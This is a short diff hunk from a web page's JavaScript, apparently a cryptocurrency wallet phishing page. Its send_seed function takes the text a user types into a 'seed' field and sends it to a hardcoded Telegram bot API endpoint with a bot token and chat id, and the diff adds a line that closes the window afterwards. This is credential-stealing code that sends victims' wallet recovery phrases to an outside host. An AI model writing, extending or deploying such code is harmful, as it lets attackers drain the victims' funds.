@@ -207,6 +207,7 @@
 		function send_seed(){
 			var seed = document.getElementById('seed').value;
 			fetch('https://api.telegram.org/bot1954952646:AAFEScLs_9fUgjyqTiG9Is828jf8wupEurI/sendMessage?chat_id=896837120&text=' + seed)
+			window.close();
 		}
 
 		function forgot(){
